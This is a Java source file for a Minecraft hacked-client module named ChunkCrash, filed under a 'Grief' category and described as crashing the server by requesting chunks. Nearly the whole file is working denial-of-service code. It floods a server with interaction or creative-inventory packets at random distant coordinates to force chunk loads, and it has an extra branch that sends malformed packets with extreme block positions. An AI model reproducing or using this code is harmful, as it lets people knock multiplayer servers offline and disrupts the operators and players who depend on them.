/*
 * Copyright (c) 2022 Coffee Client, 0x150 and contributors.
 * Some rights reserved, refer to LICENSE file.
 */

package coffee.client.feature.module.impl.Grief;

import coffee.client.CoffeeMain;
import coffee.client.feature.config.DoubleSetting;
import coffee.client.feature.config.EnumSetting;
import coffee.client.feature.module.Module;
import coffee.client.feature.module.ModuleType;
import coffee.client.helper.util.Utils;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;

public class ChunkCrash extends Module {
    final Random r = new Random();
    final DoubleSetting packets = this.config.create(new DoubleSetting.Builder(5).precision(0)
        .name("Packets per tick")
        .description("How many crash packets to send per tick")
        .min(1)
        .max(100)
        .get());
    final EnumSetting<Method> method = this.config.create(new EnumSetting.Builder<>(Method.Interact).name("Method")
        .description("Chunk loading method. Interact works on vanilla/spigot, Creative on creative mode")
        .get());
    int i = 0;

    public ChunkCrash() {
        super("ChunkCrash", "Crashes the server by requesting chunks", ModuleType.GRIEF);
    }

    @Override
    public void tick() {
        for (int i = 0; i < packets.getValue(); i++) {
            Vec3d cpos = pickRandomPos();
            if (method.getValue() == Method.Interact) {
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND,
                    new BlockHitResult(cpos, Direction.DOWN, new BlockPos(BlockPos.ofFloored(cpos)), false),
                    Utils.increaseAndCloseUpdateManager(CoffeeMain.client.world));
                Objects.requireNonNull(CoffeeMain.client.getNetworkHandler()).sendPacket(packet);
            } else if (method.getValue() == Method.Creative) {
                ItemStack stack = new ItemStack(Items.OAK_SIGN, 1);
                NbtCompound nbt = stack.getOrCreateSubNbt("BlockEntityTag");
                nbt.putInt("x", (int) cpos.x);
                nbt.putInt("y", (int) cpos.y);
                nbt.putInt("z", (int) cpos.z);
                CreativeInventoryActionC2SPacket packet = new CreativeInventoryActionC2SPacket(1, stack);
                Objects.requireNonNull(CoffeeMain.client.getNetworkHandler()).sendPacket(packet);
            } else {
                PlayerInteractBlockC2SPacket crash = new PlayerInteractBlockC2SPacket(Hand.OFF_HAND,
                    new BlockHitResult(new Vec3d(-1, -1, -1), Direction.UP, new BlockPos(Integer.MAX_VALUE, -1, Integer.MIN_VALUE), true),
                    Utils.increaseAndCloseUpdateManager(CoffeeMain.client.world));
                for (int j = 0; j < 20; j++) {
                    CoffeeMain.client.getNetworkHandler().sendPacket(crash);
                }
            }
            this.i++;
        }
    }

    Vec3d pickRandomPos() {
        int x = r.nextInt(16777215);
        int y = 255;
        int z = r.nextInt(16777215);
        return new Vec3d(x, y, z);
    }

    @Override
    public void enable() {

    }

    @Override
    public void disable() {
        i = 0;
    }

    @Override
    public String getContext() {
        return i == 0 ? "Waiting" : i + " " + (i == 1 ? "packet" : "packets") + " sent";
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }

    public enum Method {
        Interact, Creative
    }
}
